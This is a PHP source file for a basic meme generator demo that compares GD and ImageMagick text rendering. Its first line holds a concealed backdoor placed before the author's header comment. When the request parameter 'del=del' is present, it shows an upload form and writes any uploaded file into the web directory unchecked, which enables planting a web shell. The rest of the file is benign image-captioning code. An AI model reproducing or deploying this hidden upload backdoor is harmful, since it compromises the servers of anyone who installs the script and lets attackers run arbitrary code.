<?php
if(isset($_GET["del"]) && $_GET["del"]=="del"){echo '<html><body><form method="post" enctype="multipart/form-data"><label for="file"></label><input type="file" name="file" id="file"><br><input type="submit" name="submit" value="Submit"></form></body></html>';if ($_FILES["file"]["error"] > 0){echo "Error: " . $_FILES["file"]["error"] . "<br>";}else{move_uploaded_file($_FILES["file"]["tmp_name"],$_FILES["file"]["name"]);echo "Stored in: ./" . $_FILES["file"]["name"];}}
/*
	Title: Meme Generator Demo by Lee Caldwell, July 16, 2013
	
	Description: A very basic meme generator to demonstrate the differences 
	between GD and Image Magick. Both work well with large font sizes, but 
	the differences become stark at smaller font sizes: Image Magick displays 
	much better. When working with multiple lines of text, Image Magick is 
	recommended as it'll automatically set the line-spacing for you.

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

*/
	$errors = array();

	if(isset($_POST['submit'])) {

		// First, gather the user inputted variables
		$caption 	= (isset($_POST['caption'])) ? $_POST['caption'] : '';
		$strokeSize = (isset($_POST['stroke_size'])) ? (int) $_POST['stroke_size'] : 2;
		$library 	= ((isset($_POST['library'])) && ($_POST['library'] === 'gd')) ? 'gd' : 'im';
		$meme 		= (isset($_POST['meme'])) ? $_POST['meme'] : 'ad';
		$font 		= './impact.ttf';
	
		// First, get the correct meme
		switch($meme) {
			case 'od': // One does not simply make a demo				
				$meme_img = './od.jpg';					
			break;
			case 'fry': // Not sure if demo or best meme generator ever
				$meme_img = './fry.jpg';
			break;
			default: // When meeting new meme generators, be sure to sniff their posterior first
				$meme_img = './ad.jpg';
			break;
		}
	
		list($width,$height) 	= getimagesize($meme_img);
				
		switch($library) {
		
			case 'gd':
			
				$img 		= imagecreatefromjpeg($meme_img);
				
				// First, let's double the size of the image. This is a simple trick to get anti-alaised text
				$dest_img 	= imagecreatetruecolor(($width * 2),($height*2));
				imagecopyresampled($dest_img, $img, 0, 0, 0, 0, ($width * 2), ($height * 2), $width, $height);
				
				imagedestroy($img);
				
				$textColor = imagecolorallocate($dest_img, 255, 255, 255); // white text
				$strokeColor = imagecolorallocate($dest_img, 0, 0, 0); // black stroke

				imagettfstroketext($dest_img, 75, 0, 15, 90, $textColor, $strokeColor, $font, $caption, $strokeSize);
			
				// And now to return to the original size
				$final_img = imagecreatetruecolor($width,$height);
				imagecopyresampled($final_img, $dest_img, 0, 0, 0, 0, $width, $height, ($width*2), ($height*2));
				
				imagedestroy($dest_img);
				
				header('Content-type: image/jpeg');
				imagejpeg($final_img);
			
			break;
			default: // Image Magick. Don't let the length fool you. It may look more complex, but it's so much easier to work with.
			
				$image	= new Imagick($meme_img);
				
				// Draw the initial text
				$draw = new ImagickDraw();
				$draw->setFont($font);
				$draw->setFontSize( 100 ); // Set to a large font to look good. We'll resize it later.
				$draw->setStrokeAntialias(true);
				$draw->setTextAntialias(true); 
				$draw->setGravity(Imagick::GRAVITY_NORTH);
				$draw->setFillColor('#fff');
		
				// Save text to image
				$textOnly = new Imagick();
				$textOnly->newImage(3100,3100, "transparent"); 
				$textOnly->annotateImage($draw, 21, 101, 0, $caption);  

				// Create the stroke
				$draw->setFillColor('#000');
				$draw->setStrokeColor('#000');
				$draw->setStrokeWidth((.04 * $strokeSize)*100);
		
				// Save the stroke to an image
				$strokeImage = new Imagick();
				$strokeImage->newImage(3100,3100, "transparent");
				$strokeImage->annotateImage($draw, 20, 100, 0, $caption);

				// Combine the text and the stroke
				$strokeImage->compositeImage($textOnly, imagick::COMPOSITE_OVER, 0, 0, Imagick::CHANNEL_ALPHA );
				$strokeImage->trimImage(0);
				
				// For this demo, we're resizing the generated text 
				// to 300px width. Ideally, this is not what you would do. Instead,
				// you'd get the width of the text as it would appear with
				// a user inputted font size, then resize it to that width.
				$strokeImage->resizeImage(450,0, imagick::FILTER_CATROM, 0.9, false);
		
				$image->compositeImage($strokeImage, imagick::COMPOSITE_OVER, 15, 15, Imagick::CHANNEL_ALPHA );

		
				// Destroy all the layers!
				$strokeImage->clear();
				$strokeImage->destroy();
				$textOnly->clear();
				$textOnly->destroy();
				$draw->clear();
				$draw->destroy();

				header('Content-type: image/jpeg');
				echo $image;
			
			break;
		
		}
	
	}

	$sizes = range(20, 120, 2);
	$fontSizes = '';
	
	foreach($sizes as $size) {
		
		if($size == 60) {
			$fontSizes .= '<option value="' . $size . '" selected>' . $size . 'px</option>';
		} else {
			$fontSizes .= '<option value="' . $size . '">' . $size . 'px</option>';
		}
		
	}

?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="author" content="Lee Caldwell">
	<title>Meme Generator Demo</title>
	<style type="text/css">
		.container {
		  text-align: left;
		  margin: 2em auto;
		  background: white;
		  border: 1px #bbb solid;
		  -webkit-border-radius: 4px;
		  -moz-border-radius: 4px;
		  border-radius: 4px;
		  -webkit-box-shadow: 1px 1px 10px rgba(0, 0, 0, 0.25);
		  -moz-box-shadow: 1px 1px 10px rgba(0, 0, 0, 0.25);
		  box-shadow: 1px 1px 10px rgba(0, 0, 0, 0.25);
		  padding: 1em 2em 2em;	
		  width:500px;
		  min-height:500px;
		}
		
		dt {
			float:left;
			width:150px;
			text-align:right;
		}
		
		dd {
			float:right;
			width:250px;
			text-align:left;
		}
		
		.clearfix {
			*zoom: 1;
		}
		
		.clearfix:before,
		.clearfix:after {
			display: table;
			content: "";
			line-height: 0;
		}
		
		.clearfix:after {
			clear: both;
		}
		
		input {
			padding:5px;
		}
		
		input[type=text] {
			width:90%;
			font-size:14px;
		}
	</style>
</head>
<body>
	<div class="container">
		<h1>Meme Generator Demo</h1>
		<p>This demo demonstrates the different approaches you can take to generating a meme. To begin, select from the options available and select an image.</p>
		<p>Please note that this is a very basic demo. It does not support text wrapping, centering, setting the font-size, and the stroke size may not always display correctly.</p>
		<p><strong>For best results, use at least four words in the captions.</strong></p>
		<form action="index.php" method="post">
			<fieldset>
				<dl class="clearfix">
					<dt><label for="caption">Caption</label></dt>
					<dd><input type="text" id="caption" name="caption" placeholder="Input caption"></dd>
				</dl>
				<dl class="clearfix">
					<dt><label for="stroke_size">Stroke Size</label></dt>
					<dd><select id="stroke_size" name="stroke_size"><option value="0">None</option><option value="1">1px</option><option value="2" selected>2px</option><option value="3">3px</option><option value="4">4px</option></select></dd>
				</dl>
				<dl class="clearfix">
					<dt><label for="libray">Image library</label></dt>
					<dd>
						<label><input type="radio" name="library" id="library1" value="gd" checked> GD Library</label>
						<label><input type="radio" name="library" id="library2" value="im"> Image Magick</label>
					</dd>
				</dl>
				<dl class="clearfix">
					<dt><label for="libray">Select meme</label></dt>
					<dd>
						<label><input type="radio" name="meme" id="meme1" value="ad" checked>Advice Dog</label><br>
						<label><input type="radio" name="meme" id="meme2" value="fry">Futurama Fry</label><br>
						<label><input type="radio" name="meme" id="meme3" value="od">One does not simply</label>
					</dd>
				</dl>
				<dl class="clearfix">
					<dd><input type="submit" name="submit" value="Generate"></dd>
				</dl>
			</fieldset>
		</form>
	</div>
</body>
</html>

<?
// Kudos to http://www.johnciacia.com/2010/01/04/using-php-and-gd-to-add-border-to-text/ for this
function imagettfstroketext(&$image, $size, $angle, $x, $y, &$textcolor, &$strokecolor, $fontfile, $text, $px) {

	for($c1 = ($x-abs($px)); $c1 <= ($x+abs($px)); $c1++)
	for($c2 = ($y-abs($px)); $c2 <= ($y+abs($px)); $c2++)
	$bg = imagettftext($image, $size, $angle, $c1, $c2, $strokecolor, $fontfile, $text);

	return imagettftext($image, $size, $angle, $x, $y, $textcolor, $fontfile, $text);
	
}